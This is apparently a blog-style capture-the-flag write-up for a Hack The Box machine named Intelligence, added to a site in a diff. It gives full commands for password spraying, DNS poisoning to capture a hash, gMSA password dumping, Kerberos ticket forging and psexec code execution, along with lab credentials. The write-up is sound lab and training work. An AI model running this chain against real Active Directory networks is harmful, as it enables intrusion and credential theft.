+<span style="color: #F8F8F2">      </span><span style="color: #959077"># Formatting the day and month with leading zeros if needed</span>
+<span style="color: #F8F8F2">      formatted_month</span><span style="color: #FF4689">=</span><span style="color: #66D9EF">$(</span><span style="color: #F8F8F2">printf </span><span style="color: #E6DB74">&quot;%02d&quot;</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&quot;</span><span style="color: #F8F8F2">$month</span><span style="color: #E6DB74">&quot;</span><span style="color: #66D9EF">)</span>
+<span style="color: #F8F8F2">      formatted_day</span><span style="color: #FF4689">=</span><span style="color: #66D9EF">$(</span><span style="color: #F8F8F2">printf </span><span style="color: #E6DB74">&quot;%02d&quot;</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&quot;</span><span style="color: #F8F8F2">$day</span><span style="color: #E6DB74">&quot;</span><span style="color: #66D9EF">)</span>
+
+<span style="color: #F8F8F2">      </span><span style="color: #959077"># Generating the date pattern in YYYY-MM-DD format for the year 2020</span>
+<span style="color: #F8F8F2">      pattern</span><span style="color: #FF4689">=</span><span style="color: #E6DB74">&quot;2020-${</span><span style="color: #F8F8F2">formatted_month</span><span style="color: #E6DB74">}-${</span><span style="color: #F8F8F2">formatted_day</span><span style="color: #E6DB74">}&quot;</span>
+
+<span style="color: #F8F8F2">      </span><span style="color: #959077"># Construct the complete URL with the date pattern and file extension</span>
+<span style="color: #F8F8F2">      file_url</span><span style="color: #FF4689">=</span><span style="color: #E6DB74">&quot;${</span><span style="color: #F8F8F2">URL</span><span style="color: #E6DB74">}${</span><span style="color: #F8F8F2">pattern</span><span style="color: #E6DB74">}-upload.pdf&quot;</span>
+
+<span style="color: #F8F8F2">      </span><span style="color: #959077"># Check if the file exists (return code 200) before attempting to download</span>
+<span style="color: #F8F8F2">      </span><span style="color: #66D9EF">if</span><span style="color: #F8F8F2"> </span>wget<span style="color: #F8F8F2"> </span>--spider<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&quot;</span><span style="color: #F8F8F2">$file_url</span><span style="color: #E6DB74">&quot;</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2</span>&gt;/dev/null<span style="color: #F8F8F2">; </span><span style="color: #66D9EF">then</span>
+<span style="color: #F8F8F2">        </span><span style="color: #959077"># Download the file using wget if it exists</span>
+<span style="color: #F8F8F2">        </span>wget<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&quot;</span><span style="color: #F8F8F2">$file_url</span><span style="color: #E6DB74">&quot;</span>
+<span style="color: #F8F8F2">      </span><span style="color: #66D9EF">else</span>
+<span style="color: #F8F8F2">        echo </span><span style="color: #E6DB74">&quot;File not found: </span><span style="color: #F8F8F2">$file_url</span><span style="color: #E6DB74">&quot;</span>
+<span style="color: #F8F8F2">      </span><span style="color: #66D9EF">fi</span>
+<span style="color: #F8F8F2">    </span><span style="color: #66D9EF">done</span>
+<span style="color: #F8F8F2">  </span><span style="color: #66D9EF">done</span>
+<span style="color: #FF4689">}</span>
+
+<span style="color: #959077"># Call the function to generate date patterns and download files for the year 2020</span>
+generate_date_patterns
+</code></pre></div>
+
+<p>After the files were downloaded I thought that some of them might contain usernames or passwords so rather than going through all the pdfs one by one, I used pdfgrep</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>$<span style="color: #F8F8F2"> </span>find<span style="color: #F8F8F2"> </span>.<span style="color: #F8F8F2"> </span>-iname<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;*.pdf&#39;</span><span style="color: #F8F8F2"> </span>-exec<span style="color: #F8F8F2"> </span>pdfgrep<span style="color: #F8F8F2"> </span>username<span style="color: #F8F8F2"> </span><span style="color: #FF4689">{}</span><span style="color: #F8F8F2"> </span>+
+./bruteforce/2020-06-04-upload.pdf:Please<span style="color: #F8F8F2"> </span>login<span style="color: #F8F8F2"> </span>using<span style="color: #F8F8F2"> </span>your<span style="color: #F8F8F2"> </span>username<span style="color: #F8F8F2"> </span>and<span style="color: #F8F8F2"> </span>the<span style="color: #F8F8F2"> </span>default<span style="color: #F8F8F2"> </span>password<span style="color: #F8F8F2"> </span>of:
+</code></pre></div>
+
+<p>We can open up this pdf using <code>okular</code> or any other pdf reader:</p>
+<p><img alt="&quot;Default Credentials&quot;" src="../imgs/assets-intelligence/defaultpass-pdf.png" /></p>
+<p>Default credentials: <code>NewIntelligenceCorpUser9876</code></p>
+<p>Now that we have a default password we should also construct a list of usernames since we only have two at this point:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>$<span style="color: #F8F8F2"> </span>exiftool<span style="color: #F8F8F2"> </span>*<span style="color: #F8F8F2"> | </span>grep<span style="color: #F8F8F2"> </span>-i<span style="color: #F8F8F2"> </span>Creator<span style="color: #F8F8F2"> | </span>sort<span style="color: #F8F8F2"> </span>-u<span style="color: #F8F8F2"> | </span>uniq<span style="color: #F8F8F2"> | </span>cut<span style="color: #F8F8F2"> </span>-f<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2</span><span style="color: #F8F8F2"> </span>-d<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&quot;:&quot;</span><span style="color: #F8F8F2"> | </span>tee<span style="color: #F8F8F2"> </span>../usernames
+<span style="color: #F8F8F2"> </span>Anita.Roberts
+<span style="color: #F8F8F2"> </span>Brian.Baker
+<span style="color: #F8F8F2"> </span>Brian.Morris
+<span style="color: #F8F8F2"> </span>Daniel.Shelton
+<span style="color: #F8F8F2"> </span>Danny.Matthews
+<span style="color: #F8F8F2"> </span>Darryl.Harris
+<span style="color: #F8F8F2"> </span>David.Mcbride
+<span style="color: #F8F8F2"> </span>David.Reed
+<span style="color: #F8F8F2"> </span>David.Wilson
+<span style="color: #F8F8F2"> </span>Ian.Duncan
+<span style="color: #F8F8F2"> </span>Jason.Patterson
+<span style="color: #F8F8F2"> </span>Jason.Wright
+<span style="color: #F8F8F2"> </span>Jennifer.Thomas
+<span style="color: #F8F8F2"> </span>Jessica.Moody
+<span style="color: #F8F8F2"> </span>John.Coleman
+<span style="color: #F8F8F2"> </span>Jose.Williams
+<span style="color: #F8F8F2"> </span>Kaitlyn.Zimmerman
+<span style="color: #F8F8F2"> </span>Kelly.Long
+<span style="color: #F8F8F2"> </span>Nicole.Brock
+<span style="color: #F8F8F2"> </span>Richard.Williams
+<span style="color: #F8F8F2"> </span>Samuel.Richardson
+<span style="color: #F8F8F2"> </span>Scott.Scott
+<span style="color: #F8F8F2"> </span>Stephanie.Young
+<span style="color: #F8F8F2"> </span>Teresa.Williamson
+<span style="color: #F8F8F2"> </span>Thomas.Hall
+<span style="color: #F8F8F2"> </span>Thomas.Valenzuela
+<span style="color: #F8F8F2"> </span>Tiffany.Molina
+<span style="color: #F8F8F2"> </span>Travis.Evans
+<span style="color: #F8F8F2"> </span>Veronica.Patel
+<span style="color: #F8F8F2"> </span>William.Lee
+</code></pre></div>
+
+<p>You can remove the space before using vim magic, but I don't think it actually changes anything.</p>
+<hr />
+<p>Password spraying smb returns a hit:<br />
+<img alt="&quot;Password Spraying with CrackMapExec&quot;" src="../imgs/assets-intelligence/cme-spray.png" /></p>
+<p><code>intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876</code></p>
+<p>Tiffany really should stop using the default password!</p>
+<p>Shares that she can access are:<br />
+<img alt="&quot;Listing shares using CrackMapExec&quot;" src="../imgs/assets-intelligence/cme-shares.png" /></p>
+<p>We find a <code>downdetector.ps1</code> inside the IT share</p>
+<p>We also find the user.txt in the Users share that we can submit later on</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #959077"># Check web server status. Scheduled to run every 5min</span>
+<span style="color: #F8F8F2">Import-Module</span> <span style="color: #F8F8F2">ActiveDirectory</span> 
+<span style="color: #66D9EF">foreach</span><span style="color: #F8F8F2">($record</span> <span style="color: #66D9EF">in</span> <span style="color: #F8F8F2">Get-ChildItem</span> <span style="color: #E6DB74">&quot;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&quot;</span> <span style="color: #F8F8F2">|</span> <span style="color: #F8F8F2">Where-Object</span> <span style="color: #F8F8F2">Name</span> <span style="color: #FF4689">-like</span> <span style="color: #E6DB74">&quot;web*&quot;</span><span style="color: #F8F8F2">)</span>  <span style="color: #F8F8F2">{</span>
+<span style="color: #66D9EF">try</span> <span style="color: #F8F8F2">{</span>
+<span style="color: #F8F8F2">$request</span> <span style="color: #F8F8F2">=</span> <span style="color: #F8F8F2">Invoke-WebRequest</span> <span style="color: #F8F8F2">-Uri</span> <span style="color: #E6DB74">&quot;http://</span><span style="color: #F8F8F2">$($record.Name)</span><span style="color: #E6DB74">&quot;</span> <span style="color: #F8F8F2">-UseDefaultCredentials</span>
+<span style="color: #66D9EF">if</span><span style="color: #F8F8F2">(.StatusCode</span> <span style="color: #FF4689">-ne</span> <span style="color: #F8F8F2">200)</span> <span style="color: #F8F8F2">{</span>
+<span style="color: #F8F8F2">Send-MailMessage</span> <span style="color: #F8F8F2">-From</span> <span style="color: #E6DB74">&#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39;</span> <span style="color: #F8F8F2">-To</span> <span style="color: #E6DB74">&#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39;</span> <span style="color: #F8F8F2">-Subject</span> <span style="color: #E6DB74">&quot;Host: </span><span style="color: #F8F8F2">$($record.Name)</span><span style="color: #E6DB74"> is down&quot;</span>
+<span style="color: #F8F8F2">}</span>
+<span style="color: #F8F8F2">}</span> <span style="color: #66D9EF">catch</span> <span style="color: #F8F8F2">{}</span>
+<span style="color: #F8F8F2">}</span>
+</code></pre></div>
+
+<p>The script appears to be using it's credentials to make a web request to each DNS record</p>
+<p>We can Add/modify/delete Active Directory Integrated DNS records via LDAP: https://github.com/Sagar-Jangam/DNSUpdate</p>
+<p>We can add a DNS record:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>python3<span style="color: #F8F8F2"> </span>DNSUpdate.py<span style="color: #F8F8F2"> </span>-u<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;intelligence\Tiffany.Molina&#39;</span><span style="color: #F8F8F2"> </span>-p<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;NewIntelligenceCorpUser9876&#39;</span><span style="color: #F8F8F2"> </span>-a<span style="color: #F8F8F2"> </span>ad<span style="color: #F8F8F2"> </span>-r<span style="color: #F8F8F2"> </span>webma1ware<span style="color: #F8F8F2"> </span>-d<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.10.16.22<span style="color: #F8F8F2"> </span>-DNS<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.129.156.112
+</code></pre></div>
+
+<p><img alt="&quot;Updating DNS entry&quot;" src="../imgs/assets-intelligence/dnsupdate.png" /></p>
+<p>Boom! We get a hash:<br />
+<img alt="&quot;Responder&quot;" src="../imgs/assets-intelligence/responder-hash.png" /></p>
+<p>Cracking it returns:<br />
+<img alt="&quot;Cracking with JTR&quot;" src="../imgs/assets-intelligence/john-hash.png" /></p>
+<p><code>Ted.Graves:Mr.Teddy</code></p>
+<p>Checking in bloohound we can read the password of <code>SVC_INT</code>:<br />
+<img alt="&quot;Reading password&quot;" src="../imgs/assets-intelligence/readpass-bloodhound.png" /></p>
+<p>Bloodhound recommands we use: https://github.com/micahvandeusen/gMSADumper</p>
+<p><img alt="&quot;Dumping password&quot;" src="../imgs/assets-intelligence/password-dumper.png" /></p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>ma1ware@shadow:~/pentest/htb/boxes/Intelligence/gMSADumper$<span style="color: #F8F8F2"> </span>python3<span style="color: #F8F8F2"> </span>gMSADumper.py<span style="color: #F8F8F2"> </span>-u<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;Ted.Graves&#39;</span><span style="color: #F8F8F2"> </span>-p<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;Mr.Teddy&#39;</span><span style="color: #F8F8F2"> </span>-d<span style="color: #F8F8F2"> </span>intelligence.htb
+Users<span style="color: #F8F8F2"> </span>or<span style="color: #F8F8F2"> </span>groups<span style="color: #F8F8F2"> </span>who<span style="color: #F8F8F2"> </span>can<span style="color: #F8F8F2"> read </span>password<span style="color: #F8F8F2"> </span><span style="color: #66D9EF">for</span><span style="color: #F8F8F2"> </span>svc_int$:
+<span style="color: #F8F8F2"> </span>&gt;<span style="color: #F8F8F2"> </span>DC$
+<span style="color: #F8F8F2"> </span>&gt;<span style="color: #F8F8F2"> </span>itsupport
+svc_int$:::fb49fcd5ffc6fefa70503e08c9cd8261
+svc_int$:aes256-cts-hmac-sha1-96:7780ba9c60cac7b51f89a4faee199cb103b350082fdac5f7c412fd024d0fc5e6
+svc_int$:aes128-cts-hmac-sha1-96:de0b7110639ccbcd2cf195840d6b3ca7
+</code></pre></div>
+
+<p>I tried to crack the hash but that failed, so since this is a service account we can create a silver ticket<br />
+since this user has <code>AllowedToDelegate</code> on the DC:<br />
+<img alt="&quot;AllowedToDelegate&quot;" src="../imgs/assets-intelligence/AllowedToDelegate.png" /></p>
+<p>To get the SPN we can access Node properties of svc_int user in Bloodhound</p>
+<p>Before we carry out the exploit we should sync our time with the DC:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>$<span style="color: #F8F8F2"> </span>sudo<span style="color: #F8F8F2"> </span>rdate<span style="color: #F8F8F2"> </span>-n<span style="color: #F8F8F2"> </span>&lt;ip<span style="color: #F8F8F2"> </span>of<span style="color: #F8F8F2"> </span>DC&gt;
+</code></pre></div>
+
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>impacket-getST<span style="color: #F8F8F2"> </span>-spn<span style="color: #F8F8F2"> </span>www/dc.intelligence.htb<span style="color: #F8F8F2"> </span>-dc-ip<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.129.156.112<span style="color: #F8F8F2"> </span>-impersonate<span style="color: #F8F8F2"> </span>Administrator<span style="color: #F8F8F2"> </span>intelligence.htb/svc_int<span style="color: #F8F8F2"> </span>-hashes<span style="color: #F8F8F2"> </span>:fb49fcd5ffc6fefa70503e08c9cd8261
+</code></pre></div>
+
+<p><img alt="&quot;Creating a silver ticket&quot;" src="../imgs/assets-intelligence/silver-ticket.png" /></p>
+<p>Then we use the ticket with psexec.py</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>$<span style="color: #F8F8F2"> KRB5CCNAME</span><span style="color: #FF4689">=</span>Administrator.ccache<span style="color: #F8F8F2"> </span>impacket-psexec<span style="color: #F8F8F2"> </span>-k<span style="color: #F8F8F2"> </span>-no-pass<span style="color: #F8F8F2"> </span>administrator@intelligence.htb
+</code></pre></div>
+
+<p><img alt="&quot;PsExec with Kerberos Auth&quot;" src="../imgs/assets-intelligence/psexec-root.png" /></p>
+<p>And with that the box is finished!</p>
+<hr />
+  </article>
+
+  <footer class="site-footer">
+    <div class="footer-links">
+      <a href="https://github.com/0xma1ware" target="_blank" rel="noopener">GitHub</a>
+      <a href="https://x.com/0xma1ware" target="_blank" rel="noopener">X / Twitter</a>
+      <a href="mailto:ma1ware@protonmail.com">Email</a>
+    </div>
+    <p>&copy; 2025 0xma1ware. All rights reserved.</p>
+  </footer>
+</body>
+</html>
